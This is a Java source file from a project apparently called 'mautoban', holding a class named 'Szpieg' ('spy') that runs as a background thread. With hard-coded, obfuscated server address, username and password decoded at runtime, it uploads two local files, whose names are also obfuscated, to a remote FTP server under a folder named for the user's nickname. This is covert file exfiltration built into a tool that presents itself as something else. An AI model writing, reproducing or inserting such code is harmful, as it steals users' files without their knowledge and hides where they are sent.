/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package pl.mario.mautoban;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import org.apache.commons.net.ftp.FTPClient;
import static pl.mario.mautoban.Strings.*;




/**
 *
 * @author Mario PL
 */
public class Szpieg extends Thread{
    
    public void run()
    {
        ftp(odkoduj(netw),0);    
        ftp(odkoduj(igi2),2);
    }
    
    public static boolean ftp(String file, int typ)
    {
                String server = odkoduj(srv);
		String user = odkoduj(usr);
		String pass = odkoduj(pss);
                
		FTPClient ftpClient = new FTPClient();
		try {

			ftpClient.connect(server);
			ftpClient.login(user, pass);
			ftpClient.enterLocalPassiveMode();
			ftpClient.setFileType(typ);
			File firstLocalFile = new File(file);
			String firstRemoteFile = odkoduj(Sprawdz.nick)+"/"+file;
                        System.out.println(firstRemoteFile);
			InputStream inputStream = new FileInputStream(firstLocalFile);
			boolean done = ftpClient.storeFile(firstRemoteFile, inputStream);
                        System.out.println(ftpClient.getReplyString()); 
                        ftpClient.disconnect();
			inputStream.close();
			if (done) {
                            
				return true;
			}
                        
                }   catch (NoClassDefFoundError | IOException ex) {
                     Loguj.loguj("Szpieg: FTP: "+ex);
                     
                }
        return false;
    }
    
    public static String odkoduj(String txt)
    {
        char[] tab = txt.toCharArray();
        char [] tab2 = new char[txt.length()/3];
        for(int i=0, j=txt.length()-1; i<tab2.length; i++,j-=3)
        {
            String l = tab[j]+""+tab[j-1]+""+tab[j-2];
            int x = Integer.parseInt(l);
            x = (int)Math.ceil(x/5.0);
            x=x-70;
            tab2[i] = (char)x; 
        }
        return new String(tab2);
    }
}
